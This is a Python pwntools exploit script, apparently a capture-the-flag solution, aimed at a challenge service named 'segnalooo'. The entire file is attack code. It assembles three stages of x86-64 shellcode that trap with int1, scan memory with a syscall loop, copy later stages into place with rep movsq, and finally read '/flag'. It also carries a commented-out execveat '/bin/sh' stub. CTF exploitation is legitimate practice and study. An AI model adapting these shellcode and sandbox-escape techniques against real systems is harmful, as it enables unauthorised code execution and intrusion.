from pwn import *
from binascii import hexlify

context.binary = './stub'

if args.REMOTE:
    p = remote('segnalooo.challenges.ooo', 4321)
else:
    p = context.binary.debug(gdbscript='''
        b *0x40124c
        c
        handle SIGTRAP pass
        # hb **((void**)0x602310)
    ''')

sc = asm('''
// int1
.byte 0xf1
  pop rdi
  mov rdi, 0x100000000ff0

a:
  add rdi, 0x1000

  push 35
  pop rax
  syscall

  cmp al, 0
  jne a

  sub rdi, 0xff0-194

  lea rsi, [rip+0xe]
  mov qword [rsi+0x10], rdi
  mov r12, rsi
  lea r10, [rsi+0x20]

  jmp rdi
''')

log.info(hexdump(sc))
log.info(str(len(sc)))
log.info(f'len {len(sc)}/56')

stg2 = asm('''
  lea rax, [rip-7]
  mov r12, [rax-0x8]

  add r12, 0x1000-194

  mov rsi, rax
  add rsi, 0x100

  mov rcx, 0x100

  mov rdi, r12

  rep movsq

  lea r10, [r12+8]
  mov rdi, r12

  sub rdi, 0x1000-194
  jmp rdi
''')

stg3 = asm('''
  lea rsp, [rip+0x2000]

  // execveat(0, "/bin/sh
  // mov rax, 322
''' + shellcraft.echo('stg3\n\n') + shellcraft.cat('/flag'))

payload = hexlify(flat({0: sc, 0x38+8: 0x00 | (1<<63), 0x38+0x20: {0: stg2, 0x100+8: stg3}}, filler=b'\x90'))
log.info(payload.decode())
p.sendline(payload)
p.stream()
